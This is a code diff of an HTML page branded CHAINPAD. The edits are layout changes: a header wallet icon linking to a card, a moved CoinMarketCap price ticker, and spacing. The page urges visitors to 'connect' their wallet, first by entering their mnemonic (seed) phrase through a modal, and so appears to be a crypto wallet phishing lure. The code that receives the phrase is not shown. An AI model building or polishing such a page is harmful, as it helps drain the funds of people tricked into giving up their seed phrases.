@@ -14,30 +14,35 @@
 </head>
 <body>
   <!--Header menu-->
-  <header>
- <div class="mobile-header">
-  <div class="logo">CHAINPAD</div>
-  <div class="wallet-icon-container">
-    <div class="wallet-icon">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
-        <path d="M16 2.01l4.36 2.63m-4.36 0V10m4.36 0l2.14-1.29M14 15.54l-4.36 2.63m4.36 0V18m-4.36 0l-2.14-1.29"></path>
-      </svg>
+  <header class="fixed-header">
+    <div class="mobile-header">
+      <div class="logo">CHAINPAD</div>
+      <div class="wallet-icon-container">
+        <a href="#card">
+        <div class="wallet-icon">
+          <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><g id="Layer_2" data-name="Layer 2"><path d="m11.173 12.827a4 4 0 0 1 2.827-6.827h4v-.17a2.834 2.834 0 0 0 -2.83-2.83h-11.34a2.834 2.834 0 0 0 -2.83 2.83v8.34a2.834 2.834 0 0 0 2.83 2.83h11.34a2.834 2.834 0 0 0 2.83-2.83v-.17h-4a3.973 3.973 0 0 1 -2.827-1.173z"/><path d="m18.058 8h-3.912a2.109 2.109 0 0 0 -2.146 2.1 2.005 2.005 0 0 0 2 1.9h4.058a.942.942 0 0 0 .942-.942v-2.116a.942.942 0 0 0 -.942-.942zm-4.058 3a1 1 0 1 1 1-1 1 1 0 0 1 -1 1z"/></g></svg>
+        </div>
+        </a>
+      </div>
     </div>
-  </div>
-</div>
   </header>
+  <div class="coinmarquee-container">
+    <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/coinMarquee.js"></script>
+    <div id="coinmarketcap-widget-marquee" coins="1,1027,825,5426,52,2,74,1958,1975,2010,3408,5964,6636,3890,7083,27772,6958" currency="USD" theme="dark" transparent="false" show-symbol-logo="true"></div>
+  </div>
+ <div class="hero-title">
+   <br>
+   <br>
+   &nbsp;
+    </div>
 <!-- Hero Title Section -->
 <div class="hero-title">
-  &nbsp;
-  &nbsp;
-  &nbsp;
-  <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/coinMarquee.js"></script><div id="coinmarketcap-widget-marquee" coins="1,1027,825,5426,52,2,74,1958,1975,2010,3408,5964,6636,3890,7083,27772,6958" currency="USD" theme="dark" transparent="false" show-symbol-logo="true"></div>
+
   <h1>CONNECT TO YOUR WALLET BELOW</h1>
   <p class="subtitle">Use any of the connection methods below to get started</p>
 </div>
 <!-- Connection Method 1: Phrase -->
-<div class="card">
+<div class="card" id="card">
     <img src="asset/images/icon/upload.png" alt="Upload Icon">
     <h3>Connect using Mnemonic Phrase</h3>
     <button onclick="openModal('modal-phrase')">Connect</button>
